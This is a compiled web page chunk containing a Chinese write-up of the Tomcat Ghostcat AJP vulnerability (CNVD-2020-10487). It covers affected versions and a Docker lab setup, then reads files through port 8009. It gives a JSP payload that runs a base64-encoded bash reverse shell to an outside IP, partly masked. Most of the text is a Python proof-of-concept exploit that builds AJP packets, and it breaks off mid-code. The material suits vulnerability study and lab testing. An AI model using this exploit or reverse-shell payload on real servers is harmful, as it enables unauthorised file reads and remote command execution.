import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as u,a as n,b as s,d as t,e as p}from"./app-58e4a7d6.js";const l={},i=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"Java 是目前 Web 开发中最主流的编程语言，而 Tomcat 是当前最流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。",-1),k={href:"https://www.chaitin.cn/zh/ghostcat",target:"_blank",rel:"noopener noreferrer"},d=n("p",null,"参考链接：",-1),v={href:"https://www.chaitin.cn/zh/ghostcat",target:"_blank",rel:"noopener noreferrer"},m={href:"https://www.cnvd.org.cn/webinfo/show/5415",target:"_blank",rel:"noopener noreferrer"},b={href:"https://mp.weixin.qq.com/s/D1hiKJpah3NhEBLwtTodsg",target:"_blank",rel:"noopener noreferrer"},_={href:"https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ",target:"_blank",rel:"noopener noreferrer"},g=p(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Tomcat 6
Apache Tomcat 7 &lt; 7.0.100
Apache Tomcat 8 &lt; 8.5.51
Apache Tomcat 9 &lt; 9.0.31
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动一个Tomcat 9.0.30：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080</code>即可查看tomcat默认页面，此时通过AJP协议的8009端口亦可访问Tomcat。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>利用如下工具均可测试漏洞：</p>`,8),f={href:"https://github.com/chaitin/xray",target:"_blank",rel:"noopener noreferrer"},h={href:"https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi",target:"_blank",rel:"noopener noreferrer"},q={href:"https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi",target:"_blank",rel:"noopener noreferrer"},w=p(`<p>读取WEB-INF/web.xml文件：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021600655.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在docker的ROOT目录下新建文件用来测试是否可以成功读取，首先进入容器新建一个flag.txt文件：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>[root@VM-16-16-centos CVE-2020-1938]# docker exec -it fbe4 /bin/bash
root@fbe43a63b620:/usr/local/tomcat# cd webapps/ROOT/
root@fbe43a63b620:/usr/local/tomcat/webapps/ROOT# echo &quot;flag{Woooooooo}&quot; &gt; flag.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>执行CNVD-2020-10487-Tomcat-Ajp-lfi.py读取flag.txt文件，读取成功：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python CNVD-2020-10487-Tomcat-Ajp-lfi.py 127.0.0.1 -p 8009 -f flag.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20220412145606643.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>该漏洞需要配合文件上传漏洞才能利用，假设服务器已经有了存在一个txt文件，里面的内容可以执行任意命令（实际情况中，要利用目标服务器的文件上传功能上传文件）。</p><p>构造payload：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20220412151753346.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;%
    java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMjM3xxxxxxxxkgMD4mMQ==}|{base64,-d}|{bash,-i}&quot;).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print(&quot;&lt;pre&gt;&quot;);
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
    out.print(&quot;&lt;/pre&gt;&quot;);%&gt;

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>将内容保存在txt文件里，使用命令将txt文件复制到服务器的ROOT路径：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>[root@VM-16-16-centos CVE-2020-1938]# docker cp shell.txt fbe4:/usr/local/tomcat/webapps/ROOT/
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>要想实现文件包含，必须要运行包含的文件，所以目标文件需要是jsp。</p><p>此处需要修改CNVD-2020-10487-Tomcat-Ajp-lfi.py脚本中的文件名asdf为asdf.jsp：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20220412151136832.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>执行CNVD-2020-10487-Tomcat-Ajp-lfi.py读取shell.txt文件，执行反弹shell命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python CNVD-2020-10487-Tomcat-Ajp-lfi-shell.py 127.0.0.1 -p 8009 -f shell.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>监听6666端口，成功接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20220412152039391.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment">#CNVD-2020-10487  Tomcat-Ajp lfi</span>
<span class="token comment">#by ydhcui</span>
<span class="token keyword">import</span> struct

<span class="token comment"># Some references:</span>
<span class="token comment"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span>
<span class="token keyword">def</span> <span class="token function">pack_string</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">if</span> s <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
		<span class="token keyword">return</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;h&quot;</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
	l <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
	<span class="token keyword">return</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;H%dsb&quot;</span> <span class="token operator">%</span> l<span class="token punctuation">,</span> l<span class="token punctuation">,</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">&#39;utf8&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">unpack</span><span class="token punctuation">(</span>stream<span class="token punctuation">,</span> fmt<span class="token punctuation">)</span><span class="token punctuation">:</span>
	size <span class="token operator">=</span> struct<span class="token punctuation">.</span>calcsize<span class="token punctuation">(</span>fmt<span class="token punctuation">)</span>
	buf <span class="token operator">=</span> stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span>size<span class="token punctuation">)</span>
	<span class="token keyword">return</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span>fmt<span class="token punctuation">,</span> buf<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">unpack_string</span><span class="token punctuation">(</span>stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
	size<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;h&quot;</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span> <span class="token comment"># null string</span>
		<span class="token keyword">return</span> <span class="token boolean">None</span>
	res<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;%ds&quot;</span> <span class="token operator">%</span> size<span class="token punctuation">)</span>
	stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># \\0</span>
	<span class="token keyword">return</span> res
<span class="token keyword">class</span> <span class="token class-name">NotFoundException</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">pass</span>
<span class="token keyword">class</span> <span class="token class-name">AjpBodyRequest</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token comment"># server == web server, container == servlet</span>
	SERVER_TO_CONTAINER<span class="token punctuation">,</span> CONTAINER_TO_SERVER <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
	MAX_REQUEST_LENGTH <span class="token operator">=</span> <span class="token number">8186</span>
	<span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data_stream<span class="token punctuation">,</span> data_len<span class="token punctuation">,</span> data_direction<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		self<span class="token punctuation">.</span>data_stream <span class="token operator">=</span> data_stream
		self<span class="token punctuation">.</span>data_len <span class="token operator">=</span> data_len
		self<span class="token punctuation">.</span>data_direction <span class="token operator">=</span> data_direction
	<span class="token keyword">def</span> <span class="token function">serialize</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
		data <span class="token operator">=</span> self<span class="token punctuation">.</span>data_stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span>AjpBodyRequest<span class="token punctuation">.</span>MAX_REQUEST_LENGTH<span class="token punctuation">)</span>
		<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
			<span class="token keyword">return</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;bbH&quot;</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">)</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			res <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;H&quot;</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
			res <span class="token operator">+=</span> data
		<span class="token keyword">if</span> self<span class="token punctuation">.</span>data_direction <span class="token operator">==</span> AjpBodyRequest<span class="token punctuation">.</span>SERVER_TO_CONTAINER<span class="token punctuation">:</span>
			header <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;bbH&quot;</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			header <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;bbH&quot;</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> header <span class="token operator">+</span> res
	<span class="token keyword">def</span> <span class="token function">send_and_receive</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> socket<span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
			data <span class="token operator">=</span> self<span class="token punctuation">.</span>serialize<span class="token punctuation">(</span><span class="token punctuation">)</span>
			socket<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
			r <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
			<span class="token keyword">while</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">!=</span> AjpResponse<span class="token punctuation">.</span>GET_BODY_CHUNK <span class="token keyword">and</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">!=</span> AjpResponse<span class="token punctuation">.</span>SEND_HEADERS<span class="token punctuation">:</span>
				r <span class="token operator">=</span> AjpResponse<span class="token punctuation">.</span>receive<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>

			<span class="token keyword">if</span> r<span class="token punctuation">.</span>prefix_code <span class="token operator">==</span> AjpResponse<span class="token punctuation">.</span>SEND_HEADERS <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
				<span class="token keyword">break</span>
<span class="token keyword">class</span> <span class="token class-name">AjpForwardRequest</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	_<span class="token punctuation">,</span> OPTIONS<span class="token punctuation">,</span> GET<span class="token punctuation">,</span> HEAD<span class="token punctuation">,</span> POST<span class="token punctuation">,</span> PUT<span class="token punctuation">,</span> DELETE<span class="token punctuation">,</span> TRACE<span class="token punctuation">,</span> PROPFIND<span class="token punctuation">,</span> PROPPATCH<span class="token punctuation">,</span> MKCOL<span class="token punctuation">,</span> COPY<span class="token punctuation">,</span> MOVE<span class="token punctuation">,</span> LOCK<span class="token punctuation">,</span> UNLOCK<span class="token punctuation">,</span> ACL<span class="token punctuation">,</span> REPORT<span class="token punctuation">,</span> VERSION_CONTROL<span class="token punctuation">,</span> CHECKIN<span class="token punctuation">,</span> CHECKOUT<span class="token punctuation">,</span> UNCHECKOUT<span class="token punctuation">,</span> SEARCH<span class="token punctuation">,</span> MKWORKSPACE<span class="token punctuation">,</span> UPDATE<span class="token punctuation">,</span> LABEL<span class="token punctuation">,</span> MERGE<span class="token punctuation">,</span> BASELINE_CONTROL<span class="token punctuation">,</span> MKACTIVITY <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">28</span><span class="token punctuation">)</span>
	REQUEST_METHODS <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;GET&#39;</span><span class="token punctuation">:</span> GET<span class="token punctuation">,</span> <span class="token string">&#39;POST&#39;</span><span class="token punctuation">:</span> POST<span class="token punctuation">,</span> <span class="token string">&#39;HEAD&#39;</span><span class="token punctuation">:</span> HEAD<span class="token punctuation">,</span> <span class="token string">&#39;OPTIONS&#39;</span><span class="token punctuation">:</span> OPTIONS<span class="token punctuation">,</span> <span class="token string">&#39;PUT&#39;</span><span class="token punctuation">:</span> PUT<span class="token punctuation">,</span> <span class="token string">&#39;DELETE&#39;</span><span class="token punctuation">:</span> DELETE<span class="token punctuation">,</span> <span class="token string">&#39;TRACE&#39;</span><span class="token punctuation">:</span> TRACE<span class="token punctuation">}</span>
	<span class="token comment"># server == web server, container == servlet</span>
	SERVER_TO_CONTAINER<span class="token punctuation">,</span> CONTAINER_TO_SERVER <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
	COMMON_HEADERS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&quot;SC_REQ_ACCEPT&quot;</span><span class="token punctuation">,</span>
		<span class="token string">&quot;SC_REQ_ACCEPT_CHARSET&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_ACCEPT_ENCODING&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_ACCEPT_LANGUAGE&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_AUTHORIZATION&quot;</span><span class="token punctuation">,</span>
		<span class="token string">&quot;SC_REQ_CONNECTION&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_CONTENT_TYPE&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_CONTENT_LENGTH&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_COOKIE&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_COOKIE2&quot;</span><span class="token punctuation">,</span>
		<span class="token string">&quot;SC_REQ_HOST&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_PRAGMA&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_REFERER&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;SC_REQ_USER_AGENT&quot;</span>
	<span class="token punctuation">]</span>
	ATTRIBUTES <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&quot;context&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;servlet_path&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;remote_user&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;auth_type&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;query_string&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;route&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;ssl_cert&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;ssl_cipher&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;ssl_session&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;req_attribute&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;ssl_key_size&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;secret&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;stored_method&quot;</span><span class="token punctuation">]</span>
	<span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> data_direction<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		self<span class="token punctuation">.</span>prefix_code <span class="token operator">=</span> <span class="token number">0x02</span>
		self<span class="token punctuation">.</span>method <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>protocol <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>req_uri <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>remote_addr <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>remote_host <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>server_name <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>server_port <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>is_ssl <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>num_headers <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>request_headers <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>attributes <span class="token operator">=</span> <span class="token boolean">None</span>
		self<span class="token punctuation">.</span>data_direction <span class="token operator">=</span> data_direction
	<span class="token keyword">def</span> <span class="token function">pack_headers</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
		self<span class="token punctuation">.</span>num_headers <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>request_headers<span class="token punctuation">)</span>
		res <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
		res <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;h&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>num_headers<span class="token punctuation">)</span>
		<span class="token keyword">for</span> h_name <span class="token keyword">in</span> self<span class="token punctuation">.</span>request_headers<span class="token punctuation">:</span>
			<span class="token keyword">if</span> h_name<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">&quot;SC_REQ&quot;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
				code <span class="token operator">=</span> AjpForwardRequest<span class="token punctuation">.</span>COMMON_HEADERS<span class="token punctuation">.</span>index<span class="token punctuation">(</span>h_name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
				res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;BB&quot;</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> code<span class="token punctuation">)</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>h_name<span class="token punctuation">)</span>

			res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>request_headers<span class="token punctuation">[</span>h_name<span class="token punctuation">]</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> res

	<span class="token keyword">def</span> <span class="token function">pack_attributes</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
		res <span class="token operator">=</span> <span class="token string">b&quot;&quot;</span>
		<span class="token keyword">for</span> attr <span class="token keyword">in</span> self<span class="token punctuation">.</span>attributes<span class="token punctuation">:</span>
			a_name <span class="token operator">=</span> attr<span class="token punctuation">[</span><span class="token string">&#39;name&#39;</span><span class="token punctuation">]</span>
			code <span class="token operator">=</span> AjpForwardRequest<span class="token punctuation">.</span>ATTRIBUTES<span class="token punctuation">.</span>index<span class="token punctuation">(</span>a_name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
			res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;b&quot;</span><span class="token punctuation">,</span> code<span class="token punctuation">)</span>
			<span class="token keyword">if</span> a_name <span class="token operator">==</span> <span class="token string">&quot;req_attribute&quot;</span><span class="token punctuation">:</span>
				aa_name<span class="token punctuation">,</span> a_value <span class="token operator">=</span> attr<span class="token punctuation">[</span><span class="token string">&#39;value&#39;</span><span class="token punctuation">]</span>
				res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>aa_name<span class="token punctuation">)</span>
				res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>a_value<span class="token punctuation">)</span>
			<span class="token keyword">else</span><span class="token punctuation">:</span>
				res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>attr<span class="token punctuation">[</span><span class="token string">&#39;value&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
		res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;B&quot;</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> res
	<span class="token keyword">def</span> <span class="token function">serialize</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
		res <span class="token operator">=</span> <span class="token string">&quot;&quot;</span>
		res <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;bb&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>prefix_code<span class="token punctuation">,</span> self<span class="token punctuation">.</span>method<span class="token punctuation">)</span>
		res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>protocol<span class="token punctuation">)</span>
		res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>req_uri<span class="token punctuation">)</span>
		res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>remote_addr<span class="token punctuation">)</span>
		res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>remote_host<span class="token punctuation">)</span>
		res <span class="token operator">+=</span> pack_string<span class="token punctuation">(</span>self<span class="token punctuation">.</span>server_name<span class="token punctuation">)</span>
		res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;h&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>server_port<span class="token punctuation">)</span>
		res <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;?&quot;</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>is_ssl<span class="token punctuation">)</span>
		res <span class="token operator">+=</span> self<span class="token punctuation">.</span>pack_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
		res <span class="token operator">+=</span> self<span class="token punctuation">.</span>pack_attributes<span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">if</span> self<span class="token punctuation">.</span>data_direction <span class="token operator">==</span> AjpForwardRequest<span class="token punctuation">.</span>SERVER_TO_CONTAINER<span class="token punctuation">:</span>
			header <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;bbh&quot;</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">else</span><span class="token punctuation">:</span>
			header <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">&quot;&gt;bbh&quot;</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> header <span class="token operator">+</span> res
	<span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> raw_packet<span class="token punctuation">)</span><span class="token punctuation">:</span>
		stream <span class="token operator">=</span> StringIO<span class="token punctuation">(</span>raw_packet<span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>magic1<span class="token punctuation">,</span> self<span class="token punctuation">.</span>magic2<span class="token punctuation">,</span> data_len <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;bbH&quot;</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>prefix_code<span class="token punctuation">,</span> self<span class="token punctuation">.</span>method <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;bb&quot;</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>protocol <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>req_uri <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>remote_addr <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>remote_host <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>server_name <span class="token operator">=</span> unpack_string<span class="token punctuation">(</span>stream<span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>server_port <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;h&quot;</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>is_ssl <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;?&quot;</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>num_headers<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;H&quot;</span><span class="token punctuation">)</span>
		self<span class="token punctuation">.</span>request_headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
		<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>num_headers<span class="token punctuation">)</span><span class="token punctuation">:</span>
			code<span class="token punctuation">,</span> <span class="token operator">=</span> unpack<span class="token punctuation">(</span>stream<span class="token punctuation">,</span> <span class="token string">&quot;&gt;H&quot;</span><span class="token punctuation">)</span>
			<span class="token keyword">if</span> code <span class="token operator">&gt;</span> <span class="token number">0xA000</span><span class="token punctuation">:</span>
